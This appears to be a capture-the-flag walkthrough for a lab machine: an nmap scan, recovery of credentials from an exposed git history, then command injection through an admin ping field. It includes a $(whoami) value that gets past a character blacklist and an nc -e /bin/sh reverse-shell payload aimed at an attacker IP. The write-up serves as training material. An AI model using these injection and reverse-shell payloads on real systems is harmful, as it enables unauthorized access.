##SixgenHackback 2021
ISP user

@Autor Kostas Karnavas

###Enumeration:

Running this scan :
nmap -A -p- -O -sC -sV -oN ISP_nmap.txt 10.129.226.116

We get this.
80/tcp open  http    nginx 1.10.3
| http-git: 
|   10.129.226.116:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Updated authentication mechanism 
|     Remotes:
|_      https://github.com/TCGeek/SLAN-Website.git


Looking around i found a way do download this with git-dumper.

```bash
git-dumper https://github.com/TCGeek/SLAN-Website.git
```

If you look in the logs we see this

git log                                                  
commit e25446b87742e7dc1d1c67b79ec22d5346017c35 (HEAD -> main, origin/main)
Author: TCG <tcg@localhost.localdomain>
Date:   Fri Sep 24 15:35:07 2021 +0100

    Updated authentication mechanism

commit 9f603a39df1f26c79ab97b7806733c050b53bb75
Author: TCG <tcg@localhost.localdomain>
Date:   Fri Sep 24 15:32:30 2021 +0100

    Remove database file

commit 5e5ea07c3f30427e6e3a042416223fd484503bc4
Author: TCG <tcg@localhost.localdomain>
Date:   Fri Sep 24 15:24:50 2021 +0100

    First Commit (edited)
[1:59 AM]




So we try to revert back to the commit where the database isnt  removed

We can do this with this command:
git reset --hard 5e5ea07c3f30427e6e3a042416223fd484503bc4

In the database table we find these credentials
admin|ComplexISPPassword2021

In the admin panel there is a ping command where we inject some ip.
We can inject our own code there.
The characters  '&&',';','||','|'.'`','<','>','?','*' are blacklisted and removed
Instead we can try
{"host":"$(whoami)"}
It works!

![alt text](command.png "Title")


Now we can get a reverse shell using this payload:
{
    "host":"$(nc -e /bin/sh 10.10.14.6 1234)"
}

>Now in the /root folder there is user.txt














